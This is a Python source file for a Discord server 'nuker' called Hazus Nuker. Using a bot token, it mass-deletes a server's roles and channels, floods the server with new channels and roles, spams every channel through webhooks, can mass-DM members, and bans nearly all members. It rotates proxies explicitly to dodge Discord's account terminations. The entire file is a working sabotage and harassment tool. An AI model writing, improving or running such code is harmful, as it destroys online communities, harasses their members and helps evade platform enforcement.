import requests
import colorama
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import random
import time

def cprint(text, type):
    if type == 0:
        print (colorama.Fore.LIGHTBLACK_EX + "[" + colorama.Fore.GREEN + "Success" + colorama.Fore.LIGHTBLACK_EX + "] " + colorama.Fore.CYAN + text)
    if type == 1:
        print (colorama.Fore.LIGHTBLACK_EX + "[" + colorama.Fore.RED + "Error" + colorama.Fore.LIGHTBLACK_EX + "] " + colorama.Fore.CYAN + text)
    if type == 2:
        print (colorama.Fore.LIGHTBLACK_EX + "[" + colorama.Fore.YELLOW + "Warn" + colorama.Fore.LIGHTBLACK_EX + "] " + colorama.Fore.CYAN + text)

def get_proxies():
    with open("proxies.txt", 'r') as file:
        proxies = []
        for line in file:
            stripped_line = line.strip()
            if not stripped_line.startswith('#'):
                proxies.append(stripped_line)
        return proxies

# Role sorting

def sort_roles(token, proxy, guildid, send_errors, proxylist):
    while True:
        try:
            response = requests.get(f'https://discord.com/api/v9/guilds/{guildid}/roles', proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}'}, timeout=1.5)
            if response.status_code == 200:
                roles = response.json()
                sorted_roles = sorted(roles, key=lambda x: x['position'], reverse=True)
                return sorted_roles
        except Exception as e:
            if send_errors.lower().strip() == "y":
                cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
            proxylist.remove(proxy)
            if not proxylist:
                cprint ("ALL PROXIES HAVE FAILED!", 1)
            else:
                proxy = random.choice(proxylist)


def get_bot_highest_role_position(token, proxy, guildid, botid, sorted_roles, send_errors, proxylist):
    while True:
        try:
            response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members/{botid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}, timeout=4)
            if response.status_code == 200:
                data = response.json()
                bot_roles = data['roles']
                bot_highest_role_position = max([role['position'] for role in sorted_roles if role['id'] in bot_roles], default=-1)
                return bot_highest_role_position
            else:
                cprint(f"Failed to fetch bot roles. Status code: {response.status_code}", 1)
                return -1
        except Exception as e:
            if send_errors.lower().strip() == "y":
                print(colorama.Fore.RED + f"GET_BOT Error: {e} with proxy {proxy}. Trying with a different one.")
            #proxylist.remove(proxy)
            if not proxylist:
                cprint ("ALL PROXIES HAVE FAILED!", 1)
            else:
                proxy = random.choice(proxylist)

def get_blacklist_users(token, proxy, guild_id, sorted_roles, bot_highest_role_position, send_errors, proxylist):
    while True:
        try:
            blacklist_users = []
            try:
                members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}, timeout=5)
                if members_response.status_code == 200:
                    members = members_response.json()
                    for member in members:
                        user_roles = member['roles']
                        user_highest_role_position = max([role['position'] for role in sorted_roles if role['id'] in user_roles], default=-1)
                        if user_highest_role_position > bot_highest_role_position:
                            blacklist_users.append(member['user']['id'])
                else:
                    print(f"Failed to fetch guild members. Status code: {members_response.status_code}")
            except Exception as e:
                print(f"Error fetching blacklist users: {e}")
            
            return blacklist_users
        except Exception as e:
            if send_errors.lower().strip() == "y":
                cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
            proxylist.remove(proxy)
            if not proxylist:
                cprint ("ALL PROXIES HAVE FAILED!", 1)
            else:
                proxy = random.choice(proxylist)

# Other functions

def delete_channel(token, proxy, channelid, proxylist, timeslooped, guildid, send_errors):
    try:
        response = requests.delete(f"https://discord.com/api/v9/channels/{channelid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}'}, timeout=1.5)
        if response.status_code == 200 or response.status_code == 204:
            cprint(f"Deleted Channel: {channelid}", 0)
        else:
            response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={'Authorization': f'Bot {token}'})
            channels = response.json()
            if channelid in channels:
                cprint("Bot is being rate limited, trying again in 1 second.", 1)
                time.sleep(1)
                timeslooped += 1
                delete_channel(token, proxy, channelid, proxylist, timeslooped, guildid, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
            print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
        proxylist.remove(proxy)
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            proxy = random.choice(proxylist)
            delete_channel(token, proxy, channelid, proxylist, timeslooped, guildid, send_errors)

def delete_role(token, proxy, roleid, guildid, proxylist, send_errors):
    try:
        response = requests.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/{roleid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}'}, timeout=1.5)
        if response.status_code == 200 or response.status_code == 204:
            cprint(f"Deleted Role: {roleid}", 0)
        else:
            response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={'Authorization': f'Bot {token}'})
            roles = response.json()
            if roleid in roles:
                cprint("Bot is being rate limited, trying again in 1 second.", 1)
                time.sleep(1)
                delete_role(token, proxy, roleid, guildid, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
            cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
        proxylist.remove(proxy)
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            proxy = random.choice(proxylist)
            delete_role(token, proxy, roleid, guildid, proxylist, send_errors)

def create_channel(token, proxy, guildid, channel_names, proxylist, send_errors):
    try:
        response = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json'}, json={'name': f'{channel_names}','type': 0}, timeout=1.5)
        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
            cprint(f"Created Channel: {channel_names}", 0)
        else:
            cprint("Bot is being rate limited, trying again in 1 second.", 1)
            time.sleep(1)
            create_channel(token, proxy, guildid, channel_names, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
                cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
        proxylist.remove(proxy)
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            proxy = random.choice(proxylist)
            create_channel(token, proxy, guildid, channel_names, proxylist, send_errors)

def post_to_webhook(proxy, webhook, spam_message, send_errors, proxylist):
    try:
        response = requests.post(webhook, proxies={"http": proxy, "https": proxy}, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4)
        if response.status_code == 204:
            cprint(f"Sent message to webhook: {webhook}", 0)
        else:
            cprint(f"Webhook {webhook} is being rate limited.", 1)
    except Exception as e:
        if send_errors.lower().strip() == "y":
                cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
        proxylist.remove(proxy)
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            proxy = random.choice(proxylist)
            post_to_webhook(proxy, webhook, spam_message, send_errors, proxylist)

def spam_channel(token, spam_message, channelid, looptimes, proxy, proxylist, max_threads, send_errors):
    while True:
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            try:
                response = requests.post(f"https://discord.com/api/v9/channels/{channelid}/webhooks", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json'}, json={'name': "Hazus Nuker",}, timeout=1.5)
                if response.ok:
                    cprint(f"Created Webhook in channel {channelid}", 0)
                    webhook_url = response.json()["url"]
                    
                    with ThreadPoolExecutor(max_workers=max_threads) as executor:
                        futures = []
                        for _ in range(looptimes):
                            futures.append(executor.submit(post_to_webhook, proxy, webhook_url, spam_message, send_errors, proxylist))
                    break
                else:
                    print(response.json())
                    cprint("Bot is being rate limited, trying again in 1 second.", 1)
                    time.sleep(1)
            except Exception as e:
                if send_errors.lower().strip() == "y":
                    cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
                proxylist.remove(proxy)
                if not proxylist:
                    cprint ("ALL PROXIES HAVE FAILED!", 1)
                else:
                    proxy = random.choice(proxylist)
    cprint(f"Finished spamming {channelid}", 0)
    return

def create_role(token, proxy, guildid, role, proxylist, send_errors):
    if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
    try:
        response = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/roles", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json'}, json={'name': f'{role}','type': 0}, timeout=1.5)
        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
            cprint(f"Created Role: {role}", 0)
            return
        else:
            cprint("Bot is being rate limited, trying again in 1 second.", 1)
            time.sleep(1)
            create_role(token, proxy, guildid, role, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
                cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
        proxylist.remove(proxy)
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            proxy = random.choice(proxylist)
            create_role(token, proxy, guildid, role, proxylist, send_errors)

def dm_member(dm_message, token, proxy, member, proxylist, send_errors):
    try:
        response = requests.post(f"https://discord.com/api/v9/users/@me/channels", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',}, json={'recipient_id': member['user']['id']}, timeout=3)
        if response.status_code == 200 or response.status_code == 204:
            channel_id = response.json()['id']
            response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',}, json={'content': dm_message}, timeout=3)
            if response.status_code == 200 or response.status_code == 204:
                cprint(f"Sent DM to {member['user']['id']}", 0)
                return
            else:
                cprint("Bot is being rate limited, trying again in 1 second.", 1)
                time.sleep(1)
                dm_member(dm_message, token, proxy, member, proxylist, send_errors)
        else:
            cprint("Bot is being rate limited, trying again in 1 second.", 1)
            time.sleep(1)
            dm_member(dm_message, token, proxy, member, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
            cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
        proxylist.remove(proxy)
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            proxy = random.choice(proxylist)
            dm_member(dm_message, token, proxy, member, proxylist, send_errors)

def ban_member(token, proxy, guildid, member, proxylist, send_errors):
    try:
        response = requests.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{member}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',},json={'reason': 'HAZUS NUKER | https://github.com/FlashGriefs/Hazus/'}, timeout=3)
        if response.status_code == 200 or response.status_code == 204:
            cprint(f"Banned {member}", 0)
            return
        else:
            cprint("Bot is being rate limited, trying again in 1 second.", 1)
            time.sleep(1)
            ban_member(token, proxy, guildid, member, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
            cprint(f"Error: {e} with proxy {proxy}. Trying with a different one.", 1)
        proxylist.remove(proxy)
        if not proxylist:
            cprint ("ALL PROXIES HAVE FAILED!", 1)
        else:
            proxy = random.choice(proxylist)
            ban_member(token, proxy, guildid, member, proxylist, send_errors)

# main functions

def delete_all_roles(token, guildid, botid, max_threads, proxylist, send_errors, blacklist_roles):
    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={'Authorization': f'Bot {token}'})
    roles = response.json()

    roles_without_blacklist = [role for role in roles if role['id'] not in blacklist_roles]
    roles_without_everyone = [role for role in roles_without_blacklist if role['name'] != '@everyone']
    print(colorama.Fore.RESET + "Deleting roles...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for roleid in roles_without_everyone:
            proxy = random.choice(proxylist)
            futures.append(executor.submit(delete_role, token, proxy, roleid['id'], guildid, proxylist, send_errors))

def delete_all_channels(token, guildid, max_threads, proxylist, send_errors):
    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={'Authorization': f'Bot {token}'})
    channels = response.json()

    channelcount = 0
    for channel in channels:
        channelcount += 1
    print (channelcount)

    print(colorama.Fore.RESET + "Deleting channels...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for channel in channels:
            proxy = random.choice(proxylist)
            futures.append(executor.submit(delete_channel, token, proxy, channel['id'], proxylist, guildid, send_errors))

def create_channels(token, guildid, channel_names, proxylist, send_errors, number_of_channels, max_threads):
    print(colorama.Fore.RESET + "Creating channels...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for i in range(number_of_channels):
            proxy = random.choice(proxylist)
            futures.append(executor.submit(create_channel, token, proxy, guildid, channel_names, proxylist, send_errors))

def spam_all_channels(guildid, token, max_threads, proxylist, spam_message, number_of_messages, send_errors):
    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={'Authorization': f'Bot {token}'})
    channels = response.json()
    print(colorama.Fore.RESET + "Creating webhooks & spamming channels...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for channel in channels:
            proxy = random.choice(proxylist)
            futures.append(executor.submit(spam_channel, token, spam_message, channel['id'], number_of_messages, proxy, proxylist, max_threads, send_errors))

def spam_roles(token, number_of_roles, guildid, role_names, proxylist, send_errors, max_threads):
    print(colorama.Fore.RESET + "Creating roles...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for i in range(number_of_roles):
            proxy = random.choice(proxylist)
            futures.append(executor.submit(create_role, token, proxy, guildid, role_names, proxylist, send_errors))

def dm_all_members(token, guildid, max_threads, proxylist, botid, dm_message, send_errors):
    print(colorama.Fore.RESET + "Dming members...")
    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members", headers={'Authorization': f'Bot {token}'}, params={'limit': 1000})
    members = response.json()
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for member in members:
            if member['user']['id'] != botid:
                proxy = random.choice(proxylist)
                futures.append(executor.submit(dm_member, dm_message, token, proxy, member, proxylist, send_errors))

def ban_all_members(token, guildid, max_threads, botid, proxylist, send_errors, blacklist_users):
    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}", headers={'Authorization': f'Bot {token}'})
    server_owner = response.json()['owner_id']
    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members", headers={'Authorization': f'Bot {token}'}, params={'limit': 1000})
    members = response.json()
    print(colorama.Fore.RESET + "Banning members...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for member in members:
            if member['user']['id'] != botid and member['user']['id'] != server_owner and member['user']['id'] not in blacklist_users:
                proxy = random.choice(proxylist)
                futures.append(executor.submit(ban_member, token, proxy, guildid, member['user']['id'], proxylist, send_errors))

def bot_nuker_helper():
    print(colorama.Fore.RED + "To prevent discord terminations it is not optional to use proxies for bot nuker. You can google ""free proxies"" to get free proxies.")
    proxylist = get_proxies()
    if not proxylist:
        print(colorama.Fore.RED + "ERROR: NO PROXIES IN PROXIES.TXT")
    token = input(colorama.Fore.RESET + "Token: ")
    response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
    if response.status_code != 200:
        print(colorama.Fore.RED + "Invalid Token.\n")
        return
    else:
        botid = response.json()['id']    
    guildid = input("Discord Server ID: ")
    number_of_roles = int(input("Number of roles to create: "))
    role_names = input("Name of roles to create: ")
    number_of_channels = int(input("Number of channels to create: "))
    channel_names = input("Name of channels to create: ")
    number_of_messages = int(input("Number of times to send message in each channel: "))
    spam_message = input("Message to spam: ")
    dm_members = input("DM all members? (Y/N): ")
    if dm_members.lower().strip() == "y":
        dm_message = input("Message to DM members: ")
    ban_members = input("Ban all members? (Y/N): ")
    max_threads = int(input("Max Threads (more threads = faster but harder on pc): "))
    send_errors = input("Print Proxy Errors To Terminal? (This will spam your terminal if you're using free/low quality proxies) (Y/N): ")

    threads = []

    cprint("Fetching users and roles", 0)

    proxy = random.choice(proxylist)
    sorted_roles = sort_roles(token, proxy, guildid, send_errors, proxylist)
    if sorted_roles:
        bot_highest_role_position = get_bot_highest_role_position(token, proxy, guildid, botid, sorted_roles, send_errors, proxylist)
        blacklist_roles = [role['id'] for role in sorted_roles if role['position'] >= bot_highest_role_position]
        blacklist_users = get_blacklist_users(token, proxy, guildid, sorted_roles, bot_highest_role_position, send_errors, proxylist)
        cprint("Fetched users/roles", 0)
    else:
        cprint("Failed to fetch users/roles", 1)

    thread = threading.Thread(target=delete_all_roles, args=(token, guildid, botid, max_threads, proxylist, send_errors, blacklist_roles))
    threads.append(thread)
    thread.start()

    delete_all_channels(token, guildid, max_threads, proxylist, send_errors)

    for thread in threads:
        thread.join()

    create_channels(token, guildid, channel_names, proxylist, send_errors, number_of_channels, max_threads)
        
    thread = threading.Thread(target=spam_all_channels, args=(guildid, token, max_threads, proxylist, spam_message, number_of_messages, send_errors))
    threads.append(thread)
    thread.start()

    spam_roles(token, number_of_roles, guildid, role_names, proxylist, send_errors, max_threads)

    if dm_members.lower().strip() == "y":
        dm_all_members(token, guildid, max_threads, proxylist, botid, dm_message, send_errors)

    if ban_members.lower().strip() == "y":
        ban_all_members(token, guildid, max_threads, botid, proxylist, send_errors, blacklist_users)

    for thread in threads:
        thread.join()

    return